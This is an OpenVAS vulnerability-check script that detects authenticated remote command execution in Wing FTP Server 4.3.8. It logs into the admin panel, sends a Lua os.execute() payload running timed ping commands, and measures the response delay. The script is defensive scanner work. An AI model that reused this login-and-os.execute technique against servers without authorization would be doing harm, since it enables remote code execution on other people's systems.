###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wing_ftp_server_command_exec_vuln.nasl 6995 2017-08-23 11:52:03Z teissa $
#
# Wing FTP Server Authenticated Command Execution Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804766");
  script_version("$Revision: 6995 $");
  script_tag(name:"cvss_base", value:"8.2");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-08-23 13:52:03 +0200 (Wed, 23 Aug 2017) $");
  script_tag(name:"creation_date", value:"2014-09-12 11:42:19 +0530 (Fri, 12 Sep 2014)");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Wing FTP Server Authenticated Command Execution Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wing FTP Server
  and is prone to authenticated remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP
  GET request and check whether it is able to execute the code remotely.");

  script_tag(name:"insight", value:"Flaw is due to the os.execute() function
  in the embedded LUA interpreter in the admin web interface is not properly
  handling specially crafted HTTP POST requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  authenticated remote attacker to execute arbitrary commands.

  Impact Level: Application");

  script_tag(name:"affected", value:"Wing FTP Server version 4.3.8, Prior
  versions may also be affected.");

  script_tag(name:"solution", value:"No solution or patch was made available for
  at least one year since disclosure of this vulnerability. Likely none will be
  provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by
  another one.
  For updates refer to http://www.wftpserver.com");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/34517");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/128045");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 5466);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
sndReq = "";
rcvRes = "";
time_taken = 0;
wait_extra_sec = 5;

## Get HTTP Port
http_port = get_http_port(default:5466);

## Get User and Pass from KB
FTPuser = get_kb_item("ftp/login");
FTPpass = get_kb_item("ftp/password");

if(!FTPuser){
  FTPuser = "anonymous";
}
if(!FTPpass){
  FTPpass = "anonymous";
}

host = http_host_name(port:http_port);

## Iterate over possible paths
foreach dir (make_list_unique("/", "/wing", "/ftp", "/wingftp", "/ftpserver", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin_login.html"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## confirm the Application
  if(">Wing FTP Server Administrator<" >< rcvRes)
  {
    ## Login Url
    url = dir + "/admin_loginok.html";

    postData =  "username=" + FTPuser + "&password=" + FTPpass +
                "&username_val=" + FTPuser + "&password_val=" +
                FTPpass + "&submit_btn=%2bLogin%2b";

    #Construct POST request for login
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    "\r\n", postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    ## Get the session id
    cookie = eregmatch(pattern:"Set-Cookie: UIDADMIN=([0-9a-z]*);", string:rcvRes);
    if(!cookie[1]){
      exit(0);
    }

    ## Construct attack request
    url = dir + '/admin_lua_script.html';

    if(host_runs("Windows") == "yes"){
      ping = "ping -n ";
      wait_extra_sec = 5;
    } else {
      ping = "ping -c ";
      wait_extra_sec = 7;
    }

    ## Added three times, to make sure its working properly
    sleep = make_list(3, 5, 7);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      postData = "command=os.execute('cmd /c " + ping + sec + " 127.0.0.1')";

      ## Construct the GET request
      sndReq = string("POST ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Cookie: UIDADMIN=", cookie[1], "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(postData), "\r\n",
                      "\r\n", postData, "\r\n");


      ## Now check how much time it's taking to execute
      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
      stop = unixtime();

      time_taken = stop - start;

      ## Time taken is always 1 less than the sec
      ## So i am adding 1 to it
      time_taken = time_taken + 1;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
